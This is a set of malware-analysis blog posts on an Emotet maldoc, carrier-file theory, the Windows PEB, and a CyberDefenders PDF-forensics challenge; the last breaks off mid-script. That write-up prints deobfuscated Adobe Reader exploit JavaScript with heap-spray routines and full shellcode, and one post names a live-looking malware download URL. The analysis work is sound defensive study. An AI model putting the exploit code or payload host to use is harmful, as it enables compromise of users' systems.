{"posts":[{"title":"Analysing Heodo Dropper, a new version of Emotet","text":"What is Emotet? Nowadays Emotet is a Trojan that is primarily spread through spam emails (malspam). The infection may arrive either via malicious script, macro-enabled document files, or malicious link. Emotet emails may contain familiar branding designed to look like a legitimate email.We can describe it as infrastructure as a service for content delivery.For example Emotet communicates with a c2 server to download additional malware like ransomware, ecc‚Ä¶Over the years Emotet was classified based on c2 server, payload and delivery solution.In this scenario the malware was sent via email. Static Analysis of the fileMD5 : 29b48523e390bf2393796049d7042461 First of all we nedd to identify what type of file this is, this can be done with a tool named DIE (Detect It Easy) We can see above that this is a Microsoft Office Document (probably with macro insides), to analyse it we use a tool called oledump.py and we can look at the output 1oldeump.py emotet.bin In this case oledump recognized 2 files that are marked with M (M means that‚Äôs a macro), we can redirect the output in a file and then open it with a text editor,in my vm I have installed sublime text 12oledump.py -s 17 -v emotet.bin &gt; s17oledump.py -s -v emotet.bin &gt; s18 Open the s17 file created and we can see that there is a function called after DocumentOpen() named Tbcepkcgnhpwx Now take a look at the s18 file we can notice that there is a lot of junk code, and if we look further we can see a string pattern //====dsfnnJJJsm388//= (one of the many )that is used to obfuscate the vba code, let‚Äôs find and replace them all ! Oh now we can assume that the malware wants to create a process, the string concatenated contains also another param : Bimqxgzblyrp.Fmgsnpdkhc , if we remember Bimqxgzblyrp is a folder name, if we look back at the result of oledump we can see that in that folder there is a big file 1oledump.py -s 14 -d emotet.bin &gt; moreStrings Now that we dumped the file we can open it and see the same pattern used before, so let‚Äôs find them and replace them all the data seems to be encrypted in base64, so fire up CyberChef and decrypt it ! We can see below that the result is a powershell script that contains a lot of IOC‚Äôs. This powershell script uses a foreach loop to iterate all the domains trying to downloada malicious file, if the download success then it breaks the loop and starts the malicious process. Fast Behavioural AnalysisI usually prefer to do the dynamic analysis first and then the static one, but in this case I thought it was better to do it in this way.So now let‚Äôs take a look at the sandobox‚Äôs results Connections viewIn the image below we can see that the malware opened 2 connections: the first one to download an executable file,the second one to upload data to a c2 server Process viewThe malware runs a base64 powershell command to open an internet connection and then runs the executable downloaded","link":"/2020/09/26/2020-09-26-Heodo-Dropper/"},{"title":"Carrier files theory","text":"MaldocA carrier file (a.k.a. ‚ÄúMalDoc‚Äú) is a document that carries with it a malicious payload.The most common carrier files are Office documents along with Portable Document Format(PDF) files.These files are also named MalDocs in security community. Transfer techniquesThese types of files are often attached or linked within emailnowadays there are a lot of detection techinques and email attachments are the #1 malware entry vector for businesses because users often transfer documents via email and they are prone to open attachments for example: Purchase Orders Resumes Receipts Contract Proposals Downloader vs DropperDownloader Reaches out to external resource via Internet Downloads malware -&gt; executes on host When opening, requires Internet access to pwn Dropper Malware contained within document Drops malware onto host -&gt; executes on host Droppers don‚Äôt require initial Internet access Quite simply, a downloader is a malicious threat that downloads additional threats (known as stages) form the Internet. Meanwhile, a dropper is a malicious threat that contains the next stage within it and is able to dropthe program on to the host and execute it. Downloaders are usually smaller, as they often contain simple (though obfuscated) scripts that download additional stages. Droppers are usually larger in size, as they must embed the next stage of the threat within themselves. Office file structures Office 97-2003 Objetc linking and embedding compound file a.k.a. ‚ÄúOLE CF‚Äù - it‚Äôs a file system MS Office XML (.xml) Office 2007+ Office Open XML (OOXML/MOX; .docx/.docm) it‚Äôs just a ZIP file with an XML structure Rich Text Format (RTF) Can embed raw OLE documents VBA MacrosIn previous Office versions, by default only signed or trusted macros can be launched by the user, because ‚Äúhigh security‚Äùmode is on by default in Office 2007, there are no more medium or high security levels.The new default level is called ‚ÄúDisable all macros with notification‚Äù and there are also new other levels, available in the new Trust Center which is a central place to set all security parameters.This is an example file structure of a .docm file: word/document.xml: document body word/styles.xml: style data word/settings.xml: settings for the document docProps/app.xmlandcore.xml: metadata (author, title, ‚Ä¶) There may also be optional binary files: Pictures and other media: JPEG, PNG, GIF, TIFF, WMF, ‚Ä¶ OLE objects, VBA macros, printer settings, ‚Ä¶ Macros storage :VBA macros are stored in a file named vbaProject.bin, which path in the archive depends on the application: Word: word/vbaProject.bin Excel: xl/vbaProject.bin PowerPoint: ppt/vbaProject.bin This is a binary file using Microsoft OLE2 format (structuredstorage), and this is not described in the current Open XMLspecifications. Maldoc sampleYou can take this sample via any.run :md5 : b92021ca10aed3046fc3be5ac1c2a094 This file is a .docm because if you open it with an hex editor you can see the magic number 0x50 0x4B PK (stands for Phil Kats the creator of the zip file format), so probably it would contains macros. If you analyze it with oledump.py you can see that streams A17 and A18 contain macros, notice that the streams __SRP_* means that the macros are cached and the macros were run before we took the sample. If we open the VBA editor in office with with CTRL-F11 we can notice that stream pGv5GCKO wants to create a process, and if we debug it, we can retrieve the powershell script that it runs. With a fast behaviour analysis we can see the powershell script with event viewer and we notice that the malware tried to connect tohttp://blockchainjoblist.com/wp-admin/014080 below the decoded powershell script we can notice that it tries to download an exe from the urls provided in the $pLjBqINE variable and and save it under %USER% env variable under the name 284.exe and runs it.","link":"/2021/01/31/2021-01-31-Maldoc/"},{"title":"Understanding the Windows PEB","text":"IntroductionDuring malware analysis, I often encounter shellcode that abuse the PEB structure to dinamically constructs it‚Äôs own import table. The PEB (Process Environment Block), according to MSDN is a structure that contains process informations, but I prefer Geoff Chapell‚Äôs definition that describe the PEB structure like a process‚Äôs user-mode representation created by the kernel and managed mostly in user mode, and in practice is used to share data between processes instead of creating an inter-process-communication (IPC). PEB has been present in Windows since the introduction of Win2k. How to useIn all recent Win x86 versions, the FS register points to the TEB (Thread Environment Block) structure defined in Winternl.h like a structure that contains the running thread‚Äôs informations similarly like PEB, and also visible using the public avaiable microsoft debug symbols. 123456789101112131415161718192021222324250:000&gt; dt ntdll!_TEB +0x000 NtTib : _NT_TIB +0x01c EnvironmentPointer : Ptr32 Void +0x020 ClientId : _CLIENT_ID +0x028 ActiveRpcHandle : Ptr32 Void +0x02c ThreadLocalStoragePointer : Ptr32 Void +0x030 ProcessEnvironmentBlock : Ptr32 _PEB +0x034 LastErrorValue : Uint4B +0x038 CountOfOwnedCriticalSections : Uint4B +0x03c CsrClientThread : Ptr32 Void +0x040 Win32ThreadInfo : Ptr32 Void +0x044 User32Reserved : [26] Uint4B ... &lt;more&gt; ... For all recents x64 windows version, the GS register stores the TEB address, you may wondering if these segment registers have some processor-defined purpose like CS (Code Segment) DS (Data Segment) ES(Destination Segment), the answer is no, but instead are given purpose by the OS‚Äôs running, also their name was chosen to continue the alphabetic orderüòÇ. For more informations about the background history behind this read this interesting SO thread. Now if you looked at the TEB structure above you may noticed that at offset 0x30 there is a pointer to a _PEB structure, let‚Äôs take a look at this structure. 12345678910111213141516171819202122232425262728293031323334350:000&gt; dt ntdll!_PEB +0x000 InheritedAddressSpace : UChar +0x001 ReadImageFileExecOptions : UChar +0x002 BeingDebugged : UChar +0x003 BitField : UChar +0x003 ImageUsesLargePages : Pos 0, 1 Bit +0x003 IsProtectedProcess : Pos 1, 1 Bit +0x003 IsImageDynamicallyRelocated : Pos 2, 1 Bit +0x003 SkipPatchingUser32Forwarders : Pos 3, 1 Bit +0x003 IsPackagedProcess : Pos 4, 1 Bit +0x003 IsAppContainer : Pos 5, 1 Bit +0x003 IsProtectedProcessLight : Pos 6, 1 Bit +0x003 IsLongPathAwareProcess : Pos 7, 1 Bit +0x004 Mutant : Ptr32 Void +0x008 ImageBaseAddress : Ptr32 Void +0x00c Ldr : Ptr32 _PEB_LDR_DATA +0x010 ProcessParameters : Ptr32 _RTL_USER_PROCESS_PARAMETERS ... &lt;more&gt; ... You can see a lot of important informations about the process i.e. the BeingDebugged field is used a lot from malware to avoid common dinamical analysis techniques that use the function IsDebuggerPresent() to check if the program is debugged, this function reversed using ghidra generates the following pseudocode: 12345678ulonglong IsDebuggerPresent(void){ longlong in_GS_OFFSET; return (ulonglong)*(byte *)(*(longlong *)(in_GS_OFFSET + 0x60) + 2);} The program that I wrote below, in an x86 environment, does the same thing without importing the Kernel32.dll function in order to hide from static analysis of the import table. Becoming familiar with this structure is important because a lot of Windows functions just read the PEB and TEB informations, and you can use these structure to obfuscate code or to simply avoid additional dependencies. Another interesting field is the Ldr located at offset 0xC, this is a pointer to a _PEB_LDR_DATA data structure that contains information about the loaded modules for the process, shellcode will typically walk this data structure to find the base address of loaded dlls. 123456789101112131415161718190:000&gt; dt ntdll!_PEB_LDR_DATA +0x000 Length : Uint4B +0x004 Initialized : UChar +0x008 SsHandle : Ptr32 Void +0x00c InLoadOrderModuleList : _LIST_ENTRY +0x014 InMemoryOrderModuleList : _LIST_ENTRY +0x01c InInitializationOrderModuleList : _LIST_ENTRY +0x024 EntryInProgress : Ptr32 Void +0x028 ShutdownInProgress : UChar +0x02c ShutdownThreadId : Ptr32 Void According to microsoft docs the field InMemoryOrderModuleList represents the head of a doubly-linked list where each items in the list is a pointer to a LDR_DATA_TABLE_ENTRY data structure. 12345678910111213141516171819202122230:000&gt; dt ntdll!_LDR_DATA_TABLE_ENTRY +0x000 InLoadOrderLinks : _LIST_ENTRY +0x008 InMemoryOrderLinks : _LIST_ENTRY +0x010 InInitializationOrderLinks : _LIST_ENTRY +0x018 DllBase : Ptr32 Void +0x01c EntryPoint : Ptr32 Void +0x020 SizeOfImage : Uint4B +0x024 FullDllName : _UNICODE_STRING +0x02c BaseDllName : _UNICODE_STRING +0x034 FlagGroup : [4] UChar +0x034 Flags : Uint4B ... &lt;more&gt; ... You may wondering why there are 3 double-linked lists, the response is that theoretically they should represent different things as their names suggest but in reality they are equals, these lists are defined following the MSDN. 1234567typedef struct _LIST_ENTRY { struct _LIST_ENTRY *Flink; struct _LIST_ENTRY *Blink;} LIST_ENTRY, *PLIST_ENTRY, *RESTRICTED_POINTER PRLIST_ENTRY; Assuming a 32bit environment we can see that these struct has an 8byte size, why we need to know this? Because if we choose to use the InMemoryOrderLinks list when we follow this pointer it‚Äôs taking us to _LIST_ENTRY structure InMemoryOrderLinks of the _LDR_DATA_TABLE_ENTRY of the next module that isn‚Äôt the base of the structure, for this reason we need to subtract 8 bytes from that address in order to point correctly at the _LDR_DATA_TABLE_ENTRY struct. Case StudyScopeWe are going to find the loaded modules of a simple program using winDbg to inspect them easily. Hands OnOpen winDbg and attach a debugger on some process, and execute the following command to obtain TEB information, in my case: 123456789101112131415161718192021222324252627282930310:000&gt; dt ntdll!_TEB 0x003e0000 +0x000 NtTib : _NT_TIB +0x01c EnvironmentPointer : (null) +0x020 ClientId : _CLIENT_ID +0x028 ActiveRpcHandle : (null) +0x02c ThreadLocalStoragePointer : 0x0063c340 Void +0x030 ProcessEnvironmentBlock : 0x003dd000 _PEB +0x034 LastErrorValue : 0 +0x038 CountOfOwnedCriticalSections : 0 +0x03c CsrClientThread : (null) +0x040 Win32ThreadInfo : (null) +0x044 User32Reserved : [26] 0 +0x0ac UserReserved : [5] 0 +0x0c0 WOW32Reserved : 0x77817000 Void +0x0c4 CurrentLocale : 0x410 ... &lt;more&gt; ... Now we can access and analyze the PEB structure using the address stored in the PEB Address field typing the following command: 123456789101112131415161718192021222324252627282930313233343536370:000&gt; dt ntdll!_PEB 0x003dd000 +0x000 InheritedAddressSpace : 0 '' +0x001 ReadImageFileExecOptions : 0 '' +0x002 BeingDebugged : 0x1 '' +0x003 BitField : 0 '' +0x003 ImageUsesLargePages : 0y0 +0x003 IsProtectedProcess : 0y0 +0x003 IsImageDynamicallyRelocated : 0y0 +0x003 SkipPatchingUser32Forwarders : 0y0 +0x003 IsPackagedProcess : 0y0 +0x003 IsAppContainer : 0y0 +0x003 IsProtectedProcessLight : 0y0 +0x003 IsLongPathAwareProcess : 0y0 +0x004 Mutant : 0xffffffff Void +0x008 ImageBaseAddress : 0x00400000 Void +0x00c Ldr : 0x77945d80 _PEB_LDR_DATA +0x010 ProcessParameters : 0x006323d0 _RTL_USER_PROCESS_PARAMETERS +0x014 SubSystemData : (null) ... &lt;more&gt; ... Now remember that ldr field stores the address of _PEB_LDR_DATA data structure that contains informations about the loaded modules for this process. 123456789101112131415161718190:000&gt; dt ntdll!_PEB_LDR_DATA 0x77945d80 +0x000 Length : 0x30 +0x004 Initialized : 0x1 '' +0x008 SsHandle : (null) +0x00c InLoadOrderModuleList : _LIST_ENTRY [ 0x634498 - 0x63b8c8 ] +0x014 InMemoryOrderModuleList : _LIST_ENTRY [ 0x6344a0 - 0x63b8d0 ] +0x01c InInitializationOrderModuleList : _LIST_ENTRY [ 0x6343a0 - 0x634888 ] +0x024 EntryInProgress : (null) +0x028 ShutdownInProgress : 0 '' +0x02c ShutdownThreadId : (null) Now it‚Äôs equal to choose to follow the InLoadOrderModuleList or InMemoryOrderModuleList, in this case I choosed to follow InMemoryOrderModuleList, it could be a good exercise shows that these lists are equivalents. So it‚Äôs important now to remember what I said before, when we use the InMemoryOrderLinks we need to subtract 8bytes if we are in a 32bit environment, because otherwise we encounter the following problem: 1234567891011121314151617181920210:000&gt; dt ntdll!_LDR_DATA_TABLE_ENTRY 0x6344a0 +0x000 InLoadOrderLinks : _LIST_ENTRY [ 0x634398 - 0x77945d94 ] +0x008 InMemoryOrderLinks : _LIST_ENTRY [ 0x0 - 0x0 ] +0x010 InInitializationOrderLinks : _LIST_ENTRY [ 0x400000 - 0x4b8f6b ] +0x018 DllBase : 0x0013f000 Void +0x01c EntryPoint : 0x00760074 Void +0x020 SizeOfImage : 0x632898 +0x024 FullDllName : _UNICODE_STRING &quot;ac_client.exe&quot; +0x02c BaseDllName : _UNICODE_STRING &quot;--- memory read error at address 0x0000ffff ---&quot; +0x034 FlagGroup : [4] &quot;???&quot; +0x034 Flags : 0x77945be0 You can see that the structure is incoerent, we can also deduce that FullDllName contains the value of BaseDllName so probably the structure was shifted of a number of bytes equals to 0x2c - 0x24 = 8, cool! We demonstrate that to allineate correctly the structure we need to subtract 8 bytes 12345678910111213141516171819202122230:000&gt; dt ntdll!_LDR_DATA_TABLE_ENTRY (0x6344a0 - 0x8) +0x000 InLoadOrderLinks : _LIST_ENTRY [ 0x634390 - 0x77945d8c ] +0x008 InMemoryOrderLinks : _LIST_ENTRY [ 0x634398 - 0x77945d94 ] +0x010 InInitializationOrderLinks : _LIST_ENTRY [ 0x0 - 0x0 ] +0x018 DllBase : 0x00400000 Void +0x01c EntryPoint : 0x004b8f6b Void +0x020 SizeOfImage : 0x13f000 +0x024 FullDllName : _UNICODE_STRING &quot;C:\\Program Files (x86)\\AssaultCube\\bin_win32\\ac_client.exe&quot; +0x02c BaseDllName : _UNICODE_STRING &quot;ac_client.exe&quot; +0x034 FlagGroup : [4] &quot;???&quot; +0x034 Flags : 0x800022cc ... &lt;more&gt; ... Now we can see that the structure seems correct, if we follow the linked list we would obtain the following modules, let‚Äôs try to extract the following modules! 12345678910111213141516171819202122230:000&gt; dt ntdll!_LDR_DATA_TABLE_ENTRY (0x634398 - 0x8) +0x000 InLoadOrderLinks : _LIST_ENTRY [ 0x634878 - 0x634498 ] +0x008 InMemoryOrderLinks : _LIST_ENTRY [ 0x634880 - 0x6344a0 ] +0x010 InInitializationOrderLinks : _LIST_ENTRY [ 0x634c58 - 0x77945d9c ] +0x018 DllBase : 0x77820000 Void +0x01c EntryPoint : (null) +0x020 SizeOfImage : 0x1a3000 +0x024 FullDllName : _UNICODE_STRING &quot;C:\\WINDOWS\\SYSTEM32\\ntdll.dll&quot; +0x02c BaseDllName : _UNICODE_STRING &quot;ntdll.dll&quot; +0x034 FlagGroup : [4] &quot;???&quot; +0x034 Flags : 0xa2c4 ... &lt;more&gt; ... We can clearly see that the second loaded module is the ntdll.dll, in fact this is the Windows core library and it should be loaded before any other dll libraries, except ntoskrnl.dll. 12345678910111213141516171819202122230:000&gt; dt ntdll!_LDR_DATA_TABLE_ENTRY (0x634880 - 0x8) +0x000 InLoadOrderLinks : _LIST_ENTRY [ 0x634c48 - 0x634390 ] +0x008 InMemoryOrderLinks : _LIST_ENTRY [ 0x634c50 - 0x634398 ] +0x010 InInitializationOrderLinks : _LIST_ENTRY [ 0x77945d9c - 0x634c58 ] +0x018 DllBase : 0x762a0000 Void +0x01c EntryPoint : 0x762bf640 Void +0x020 SizeOfImage : 0xf0000 +0x024 FullDllName : _UNICODE_STRING &quot;C:\\WINDOWS\\System32\\KERNEL32.DLL&quot; +0x02c BaseDllName : _UNICODE_STRING &quot;KERNEL32.DLL&quot; +0x034 FlagGroup : [4] &quot;???&quot; +0x034 Flags : 0xca2cc ... &lt;more&gt; ... The third loaded module is Kernel32.dll, keep in mind that the modules are loaded following this pattern: Exe module ntdll.dll kernel32.dll The rest of the modules depends on the program flow, dependencies, ecc.., it‚Äôs very important this concept because the majority of the shellcode that I analyze always retrieve the base address of the kernel32.dll module in order to call i.e. GetProcAddress, LoadLibrary. Final ThoughtsUnderstand the way Processes and Threads are represented helps analyzing malicious code, but also writing efficient code from a programming perspective.","link":"/2022/02/12/2022-02-12-PEB/"},{"title":"Cyberdefenders - GetPDF","text":"IntroductionHey folks, I‚Äôd like to propose this cool challenge offered by The Honeynet Project, GetPDF in my opinion it‚Äôs an interesting challenge that focus primarly on PDF forensic analysis and reverse engineering of some custom CVE‚Äôs implementations in JavaScript. PCAP AnalysisFirst of all, I analyzed the PCAP using wireshark, it showed me a bunch of HTTP and DNS requests, PS: it sounds like christmas day üòÉ, since the challenge involves the analysis of a PDF document, I started analyze the following HTTP request:Following the TCP stream I get the following content: PDF AnalysisOnce extracted the PDF document, I tried to get an overview of the PDF content parsing his structure using pdfid: 123456789101112131415161718192021222324remnux@remnux:~/Desktop/c31-Malicious-Portable$ pdfid.py fcexploit.pdfPDFiD 0.2.5 fcexploit.pdf PDF Header: %PDF-1.3 obj 19 endobj 18 stream 5 endstream 5 xref 1 trailer 1 startxref 1 /Page 2 /Encrypt 0 /ObjStm 0 /JS 1 /JavaScript 1 /AA 0 /OpenAction 1 /AcroForm 1 /JBIG2Decode 0 /RichMedia 0 /Launch 0 /EmbeddedFile 1 /XFA 1 /Colors &gt; 2^24 0 We can clearly see that there‚Äôs some JavaScript code inside that‚Äôs embedded in the document that‚Äôs probably will be executed when the document is opened.To view what objects are involved with js code I used to launch pdf-parser: 1234567891011121314151617181920remnux@remnux:~/Desktop/c31-Malicious-Portable$ pdf-parser.py -a fcexploit.pdfComment: 10XREF: 1Trailer: 1StartXref: 1Indirect object: 18 7: 5, 7, 9, 10, 22, 23, 28 /Action 1: 4 /Annot 3: 6, 8, 24 /Catalog 2: 1, 27 /EmbeddedFile 1: 11 /Page 2: 3, 25 /Pages 2: 2, 26Search keywords: /JS 1: 4 /JavaScript 1: 4 /OpenAction 1: 1 /AcroForm 1: 27 /EmbeddedFile 1: 11 /XFA 1: 28 Digging deeply I finally found the stream: 123456789101112131415161718remnux@remnux:~/Desktop/c31-Malicious-Portable$ pdf-parser.py -o 4 fcexploit.pdfobj 4 0 Type: /Action Referencing: 5 0 R &lt;&lt; /Type /Action /S /JavaScript /JS 5 0 R &gt;&gt;remnux@remnux:~/Desktop/c31-Malicious-Portable$ pdf-parser.py -o 5 fcexploit.pdfobj 5 0 Type: Referencing: Contains stream &lt;&lt; /Length 395 /Filter [ /FlateDecode /ASCII85Decode /LZWDecode /RunLengthDecode ] &gt;&gt; I noticed that the stream was encoded with different filters: FlateDecode, ASCII85Decode, LZWDecode, RunLengthDecode; In order to decode and extract it I used pdfextract: 123456789101112remnux@remnux:~/Desktop/c31-Malicious-Portable$ pdfextract fcexploit.pdf /var/lib/gems/2.7.0/gems/origami-2.1.0/lib/origami/string.rb:416: warning: Using the last argument as keyword parameters is deprecated; maybe ** should be added to the call/var/lib/gems/2.7.0/gems/origami-2.1.0/lib/origami/string.rb:373: warning: The called method `initialize' is defined here[error] Object shall end with 'endobj' statement[error] Breaking on: &quot;&gt;&gt;/Parent ...&quot; at offset 0x60c7[error] Last exception: [Origami::InvalidObjectError] Failed to parse object (no:25,gen:0) -&gt; [Origami::InvalidDictionaryObjectError] Invalid object for field /XObjectExtracted 5 PDF streams to 'fcexploit.dump/streams'.Extracted 1 scripts to 'fcexploit.dump/scripts'.Extracted 0 attachments to 'fcexploit.dump/attachments'.Extracted 0 fonts to 'fcexploit.dump/fonts'.Extracted 0 images to 'fcexploit.dump/images'. JS deobfuscationUsing de4js on the extracted script gaves the following obfuscated script: 12345678910111213141516171819202122232425var SSS = null;var SS = &quot;ev&quot;;var titleStr = &quot;&quot;;$5 = &quot;in&quot;;app.doc.syncAnnotScan();S$ = &quot;ti&quot;;if (app.plugIns.length != 0) { var $$ = 0; S$ += &quot;tl&quot;; $5 += &quot;fo&quot;; ____SSS = app.doc.getAnnots({ nPage: 0 }); S$ += &quot;e&quot;; titleStr = this.info.title;}var payload = &quot;&quot;;if (app.plugIns.length &gt; 3) { SS += &quot;a&quot;; var arr = titleStr.split(/U_155bf62c9aU_7917ab39/); for (var $ = 1; $ &lt; arr.length; $++) { payload += String.fromCharCode(&quot;0x&quot; + arr[$]); } SS += &quot;l&quot;;} After manually deobfuscated the script results as following: 123456789101112131415161718192021222324252627var titleStr = &quot;&quot;;app.doc.syncAnnotScan();if (app.plugIns.length != 0) { annots = app.doc.getAnnots({ nPage: 0 }); titleStr = this.info.title;}var payload = &quot;&quot;;if (app.plugIns.length &gt; 3) { var arr = titleStr.split(/U_155bf62c9aU_7917ab39/); for (var $ = 1; $ &lt; arr.length; $++) { payload += String.fromCharCode(&quot;0x&quot; + arr[$]); } app.eval(payload); /* payload = encodedPayloadPart1 = annots[1].subject; encodedPayload = encodedPayloadPart1.replace(/X_17844743X_170987743/g, &quot;%&quot;); encodedPayloadPart2 = annots[0].subject; encodedPayload += encodedPayloadPart2.replace(/89af50d/g, &quot;%&quot;); encodedPayload = encodedPayload.replace(/\\n/, &quot;&quot;); encodedPayload = encodedPayload.replace(/\\r/, &quot;&quot;); decodedPayload = unescape(encodedPayload); app.eval(decodedPayload) */} This isn‚Äôt simple JavaScript, it makes use of Adobe Acrobat specific JavaScript objects and methods to refer to the currently loaded document (app.doc), to identify any ‚Äúannotations‚Äù within this document (syncAnnotScan), to access the first and second annotations (getAnnots), to assign it to variables, and finally to eval (run) the code within these variables.To retrieve the encoded payload, I needed to first retrieve the streams involved, for that I used pdf-parser.py with -a flag to find the annotations objects: 12remnux@remnux:~/Desktop/c31-Malicious-Portable$ pdf-parser.py -a fcexploit.pdf | grep Annot /Annot 3: 6, 8, 24 We can clearly see that the objects involved inside the payload are object 6 and 8, after analyze them we can see that contain just a reference to an object filtered stream, respectively object 7 and 9: 12345678910111213141516171819202122232425262728293031323334353637383940remnux@remnux:~/Desktop/c31-Malicious-Portable$ pdf-parser.py -o 6 fcexploit.pdfobj 6 0 Type: /Annot Referencing: 7 0 R &lt;&lt; /Type /Annot /Subtype /Text /Name /Comment /Rect [ 200 250 300 320 ] /Subj 7 0 R &gt;&gt;remnux@remnux:~/Desktop/c31-Malicious-Portable$ pdf-parser.py -o 7 fcexploit.pdfobj 7 0 Type: Referencing: Contains stream &lt;&lt; /Length 8714 /Filter [ /FlateDecode /ASCII85Decode /LZWDecode /RunLengthDecode ] &gt;&gt;remnux@remnux:~/Desktop/c31-Malicious-Portable$ pdf-parser.py -o 8 fcexploit.pdfobj 8 0 Type: /Annot Referencing: 9 0 R &lt;&lt; /Type /Annot /Subtype /Text /Name /Comment /Rect [100 180 300 210 ] /Subj 9 0 R &gt;&gt;remnux@remnux:~/Desktop/c31-Malicious-Portable$ pdf-parser.py -o 9 fcexploit.pdfobj 9 0 Type: Referencing: Contains stream &lt;&lt; /Length 10522 /Filter [ /FlateDecode /ASCII85Decode /LZWDecode /RunLengthDecode ] &gt;&gt; Now that I know which streams are contained in the payload I have to assemble the encoded payload: 12remnux@remnux:~/Desktop/c31-Malicious-Portable$ cat fcexploit.dump/streams/stream_9.dmp &gt; stream_encoded_payload.dmpremnux@remnux:~/Desktop/c31-Malicious-Portable$ cat fcexploit.dump/streams/stream_7.dmp &gt;&gt; stream_encoded_payload.dmp Now I fired up my best friend tool (Cyberchef‚ù§Ô∏è) and started decoding the payload using this recipe, after some decoding routines and manually deobfuscation I get the following script: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125function s(yarsp, len) { while (yarsp.length * 2 &lt; len) { yarsp += yarsp; } yarsp = yarsp.substring(0, len / 2); return yarsp;}function common_exploit() { var chunk_size, payload, nopsled; chunk_size = 0x8000; // calc.exe payload payload = unescape(&quot;%uabba%ua906%u29f1%ud9c9%ud9c9%u2474%ub1f4%u5d64%uc583%u3104%u0f55%u5503%ue20f%ued5e%uabb9%uc1ea%u2d70%u1953%u3282%u6897%ud01d%u872d%ufd18%ua73a%u02dc%u14cc%u64ba%u66b5%uae41%uf16c%u5623%udb7c%u7bc1%u5e69%u69dd%uf0b0%ucf0c%u1950%udd95%u5ab9%u7b37%u772b%uc55f%u1531%ue18d%u70c8%uc2c5%u4c1c%u7b34%u2f3a%ue82b%u27c9%u848b%ua512%u999d%u2faa%u84c0%u2bee%u768c%u0bc8%u237e%u4cc6%u51c2%u3abc%ufc45%u1118%uffe5%uf48a%udf14%u6c2f%u8742%u0a57%u6fe9%ub5b5%uca94%ua6ab%u84ba%u77d1%u4a2c%u74ac%uabcf%ub25f%ub269%u5e06%u51d5%u90f3%u978f%uec66%u6942%u6a9b%u18a2%u12ff%u42ba%u7be5%ubb37%u9dc6%u5de0%ufe14%uf2f7%uc6fd%u7812%uda44%u7167%u110f%ubb01%uf81a%ud953%ufc21%u22db%u20f7%u46b9%u27e6%ue127%u8e42%udb91%ufe58%ubaeb%u6492%u07fe%uade3%u4998%uf89a%u9803%u5131%u1192%ufcd5%u3ac9%u352d%u71de%u81cb%u4522%u6d21%uecd2%ucb1c%u4e6d%u8df8%u6eeb%ubff8%u653d%ubaf6%u8766%ud10b%u926b%ubf19%u9f4a%u0a30%u8a92%u7727%u96a7%u6347%ud3b4%u824a%uc4ae%uf24c%uf5ff%ud99b%u0ae1%u7b99%u133d%u91ad%u2573%u96a6%u3b74%ub2a1%u3c73%ue92c%u468c%uea25%u5986%u9261%u71b5%u5164%u71b3%u561f%uabf7%u91c2%ua3e6%uab09%ub60f%ua23c%ub92f%ub74b%ua308%u3cdb%ua4dd%u9221%u2732%u8339%u892b%u34a9%ub0da%ua550%u4f47%u568c%uc8fa%uc5fe%u3983%u7a98%u2306%uf60a%uc88f%u9b8d%u6e27%u305d%u1edd%uadfa%ub232%u4265%u2d3a%uff17%u83f5%u87b2%u5b90&quot;); nopsled = unescape(&quot;%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090&quot;); while (nopsled.length &lt; chunk_size) { nopsled += nopsled; } nopsled_len = chunk_size - (payload.length + 20); nopsled = nopsled.substring(0, nopsled_len); heap_chunks = new Array(); for (var i = 0; i &lt; 2500; i++) { heap_chunks[i] = nopsled + payload; } util.printd(&quot;1.000000000.000000000.1337 : 3.13.37&quot;, new Date()); try { media.newPlayer(null); } catch(e) {} util.printd(&quot;1.000000000.000000000.1337 : 3.13.37&quot;, new Date());}function first_exploit() { // freecell.exe payload var payload = unescape(&quot;%uc929%u65b1%ud7db%u74d9%uf424%u83b8%u3830%u5b84%u4331%u0313%u1343%u6883%udacc%u8571%u413d%u6a30%u13f7%ub07d%u5c06%uc249%ube91%u3948%ud6a4%u4246%ud958%uf0e9%ubf3e%ucb93%uf8bc%u520a%u60a7%ubd5e%u804d%ub8b6%ub75a%u5391%uf6b0%ub933%uea10%ubade%u91ba%ud64b%u1fdb%ub411%ub731%u92ab%uf842%u2a7a%ua0b8%uc819%uc7af%u9bee%u7d10%u4e2e%u4201%u8a96%ude7c%ud1cb%u20f0%ue235%uf4e3%u33a8%u6fbe%u8396%u15b9%ub97f%ud56a%u2c92%uf698%ud416%u50c7%u7361%u386d%u1a83%ue308%u7fb1%u7a3f%u20ac%u90a8%u2d99%u544b%u1868%ucced%u8012%u7b51%u7bef%u4d0b%u4095%u10c6%udea5%ue327%u47ed%u9d3e%u28f4%u51cb%ucfd7%u746c%u8c04%u286b%u95cd%u4396%u0b57%u58e2%ue11e%u508a%uab14%uf7cf%uab12%ufb47%u96c3%u9932%ud41d%u3bda%u7d77%uf214%ub242%u636f%u299d%u2962%u7be8%u7fe4%ub283%ub18f%uee39%u7b09%ub7de%ue345%u8c16%u2e59%u59c0%u6fa5%u263f%uda5e%u8219%ua5d1%u54fc%u0474%u75fc%u53b1%u7f0b%u599a%u9409%u48e7%uf318%u71c6%uc930%u6317%u3126%ua923%u2249%ua830%u4247%uad22%u3340%ude7b%u9f86%ue365%u8693%ufdba%u5594%u0f8f%u59bf%u0de8%u74d9%u16ff%ua327%u1cf0%ub333%u021a%uda1c%u2831%u2868%u583f%u1c0a%u720b%u6af0%u8a62%u64fe%u8883%u7ecc%u83ab%u823a%ufd8c%u0ead%u8e59%uc117%u0c8e%u7204%ufeb6%ue3bc%u9a56%u9545%u10c3%u0698%ube7e%ub5ca%u6f07%u2a75%u0a8a%uc717%ub603%u44b8%u59bc%ue62b%uf459%u93d4%u658e%u377a%u14a6%ua20e%ue517%u49c0%u6cd0%u419d&quot;); var nop = unescape(&quot;%u0A0A%u0A0A%u0A0A%u0A0A&quot;); var heapblock = nop + payload; var bigblock = unescape(&quot;%u0A0A%u0A0A&quot;); var headersize = 20; var spray = headersize + heapblock.length; while (bigblock.length &lt; spray) { bigblock += bigblock; } var fillblock = bigblock.substring(0, spray); var block = bigblock.substring(0, bigblock.length - spray); while (block.length + spray &lt; 0x40000) { block = block + block + fillblock; } var mem_array = new Array(); for (var i = 0; i &lt; 1400; i++) { mem_array[i] = block + heapblock; } var num = 